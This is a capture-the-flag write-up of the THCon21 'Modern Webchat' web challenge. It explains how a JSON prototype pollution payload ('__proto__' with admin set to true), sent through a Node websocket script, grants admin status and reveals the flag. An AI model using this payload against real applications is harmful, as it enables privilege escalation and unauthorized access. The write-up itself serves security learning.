# Modern Webchat

**Web** (250 points/ 5 solves)

## Description

IRC is a relic of the past.

## Solution

We visit the website and we land on a web chat where we can choose a nickname and a color. We can login and then be able send messages.

From time to time we receive a message from the admin wich say :

> **[admin]** **LePireBot**: _Message restricted to administrators._

Obviously we must fake the fact that we are admin in order to see the message.

When we start investigating on the app, we quickly find out a `main.js` file in the source code of the page.

 ```javascript
(() => {
  const escape = (string) =>
    string.replace(/[&<>"']/g, (chr) => {
      return {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;",
      }[chr];
    });

  const ws = new WebSocket("ws://" + location.host);

  const $loginForm = document.querySelector("#login-form");
  const $messageForm = document.querySelector("#message-form");
  const $messages = document.querySelector("#messages");

  const createMessage = (data) => {
    const $el = document.createElement("div");
    $el.className = "message";
    $el.innerHTML = `${
      data.user.admin ? "<strong>[admin]</strong> " : ""
    }<strong style="color:${data.user.color}">${escape(
      escape(data.user.nickname)
    )}</strong>: ${
      data.messageRestricted
        ? "<i>Message restricted to administrators.</i>"
        : escape(data.message)
    }`;
    return $el;
  };

  const displayConnectionError = () => {
    $messages.appendChild(
      createMessage({
        user: { nickname: "Error", color: "#ff0000" },
        message: "Connection closed unexpectedly. Please refresh the page.",
      })
    );
  };

  ws.onmessage = (e) => {
    const shouldScroll =
      $messages.scrollTop + $messages.clientHeight === $messages.scrollHeight;
    const data = JSON.parse(e.data);
    $messages.appendChild(createMessage(data));
    if (shouldScroll) {
      $messages.scrollTop = $messages.scrollHeight;
    }
    if ("successfulLogin" in data) {
      $loginForm.hidden = true;
      $messageForm.hidden = false;
    }
  };

  ws.onerror = ws.onclose = (e) => displayConnectionError();

  $loginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    if (ws.readyState !== ws.OPEN) {
      return;
    }
    ws.send(
      JSON.stringify({
        nickname: $loginForm.elements.nickname.value,
        color: $loginForm.elements.color.value,
      })
    );
  });

  $messageForm.addEventListener("submit", (e) => {
    e.preventDefault();
    if (ws.readyState !== ws.OPEN) {
      return;
    }
    ws.send(
      JSON.stringify({
        message: $messageForm.elements.message.value,
      })
    );
    $messageForm.elements.message.value = "";
  });
})();
```

So basically what we learned from this file is that the chat is based on websockets and communicating using json data.

At this point we can assume that the goal of the challenge is not to perform an xss because this `escape` function will well prevent it.

```javascript
const escape = (string) =>
   string.replace(/[&<>"']/g, (chr) => {
     return {
       "&": "&amp;",
       "<": "&lt;",
       ">": "&gt;",
       '"': "&quot;",
       "'": "&#39;",
     }[chr];
   });
```

But we also find out that there is an admin property in the user class in `createMessage` function.

While debugging the websockets we can also see this admin property in the message received from the bot.

```json
{
  "user": { "nickname": "LePireBot", "color": "#ECA400", "admin": true },
  "messageRestricted": true
}
```

So the plan is to register as admin by setting admin to `true`, for that we gonna try to just append this at the end of the json data.
A classic registration look like : 

```json
{"nickname": "xl00t", "color": "#1337FF"}
```

So our first payload is :

```json
{"nickname": "xloot", "color": "#1337FF", "admin": true}
```
But as suspected the payload will not be so simple.

After some research into the potential vulnerability of `JSON.parse()`, we find somes articles about **Prototype Pollution** in JS.

In simple terms this vulnerabity will allow us to add the admin property by using the prototype property of the user object.

Accessing a prototype in javascript can be done with `prototype` or `__proto__` property.

With that we can access object properties in different ways :

 - `user.nickname`
 - `user.prototype.nickname`
 - `user.__proto__.nickname`

Lets wrap up everything we learn so far and craft our final payload :

```json
{
    "nickname": "xloot",
    "color": "#1337ff",
    "__proto__": {
        "admin": true
    }
}
```

We reuse and modify the `main.js` file we saw earlier in order to send our payload and wait for the bot message.

```javascript
const WebSocket = require('ws');

const ws = new WebSocket("ws://remote1.thcon.party:10001");
var input = process.openStdin();

ws.onmessage = (e) => {
  const data = JSON.parse(e.data);
  console.log(data);
};

input.addListener("data", function(mes) {
    if (ws.readyState !== ws.OPEN)
        return;

    var payload = '{"nickname": "xloot","color": "#1337ff","__proto__": {"admin": true}}';
    ws.send(payload);

    var messageJson = {message: mes.toString()};
    ws.send(JSON.stringify(messageJson));
});
```

Now we lauch this script and enter a message in order to send our payload.

```
xl00t@DESKTOP:~/thcon/modern-chat$ node main.js
{
  user: { nickname: 'Info', color: '#0088ff' },
  message: 'Connected to the chat room.'
}
Gimme Flag
{
  user: { nickname: 'Info', color: '#0088ff' },
  message: 'xloot joined the chat room! 2 people connected.',
  successfulLogin: true
}
{
  user: { nickname: 'xloot', color: '#1337ff' },
  message: 'Gimme Flag\n'
}
{
  user: { nickname: 'LePireBot', color: '#ECA400', admin: true },
  message: 'Well done! Here is the flag: THCon21{__1000_points_pour_Gryffondor__}'
}
```

Well , we got the flag `THCon21{__1000_points_pour_Gryffondor__}` !

## References:
 - https://theflyingmantis.medium.com/javascript-a-prototype-based-language-7e814cc7ae0b
 - https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Inheritance
 - https://medium.com/intrinsic/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96
 - https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution

